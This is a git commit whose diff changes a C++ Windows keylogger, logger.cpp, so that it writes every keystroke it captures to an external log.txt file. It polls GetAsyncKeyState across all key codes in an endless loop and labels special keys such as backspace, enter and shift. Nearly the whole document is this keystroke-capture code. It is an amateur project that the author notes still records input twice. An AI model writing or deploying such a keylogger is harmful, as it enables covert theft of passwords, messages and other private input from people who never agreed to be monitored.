19c2d678aa0a8810d07280a157f147f5bf33cb43
bleak-alpha <71189549+bleak-alpha@users.noreply.github.com>
2023-01-02 18:19:21 +0530

    Changes to be committed: 	modified:   logger.cpp -> outputs keystrokes to an external log file 	modified:   .gitignore -> included log.txt

--- logger.cpp
+++ logger.cpp
@@ -1,23 +1,56 @@
 #include <iostream>
+#include <fstream>
 #include <windows.h>
 #include <winuser.h>
 
 using namespace std;
 
-void startLogging();
+void WinLogging();
 
 int main() {
-    startLogging();
+    WinLogging();
 }
 
-void startLogging() {
+void WinLogging() {
     while(true){
         for(char c=0; c<=254 ; c++) {
             if(GetAsyncKeyState(c) & 0x1) { //comparing last bit from both using AND
-                cout<<c;
+                ofstream log;
+                log.open("log.txt", ios::app); log<<c; //stores o/p in the log file 
+                
+                switch (c) { //for non-alphanumeric keys
+                    case VK_BACK:
+                        log << "[backspace]";
+                        break;
+                    case VK_RETURN:
+                        log << "[enter]";
+                        break;
+                    case VK_SHIFT:
+                        log << "[shift]";
+                        break;
+                    case VK_CONTROL:
+                        log << "[control]";
+                        break;
+                    case VK_CAPITAL:
+                        log << "[cap]";
+                        break;
+                    case VK_TAB:
+                        log << "[tab]";
+                        break;
+                    case VK_MENU:
+                        log << "[alt]";
+                    case VK_LBUTTON:
+                    case VK_RBUTTON:
+                        break;
+                    default:
+                        log << c;
+                }
+                //cout<<c;
+                
             }
         }
     }
 }
-//Dev note: logging works correctly but only for windows system,
-//  can detect alpha-numeric keys only, displays alpha keystrokes in uppercase regardless
+//Dev note: WinLogging works only for windows system,
+//  bug report:
+//      ->double input recording
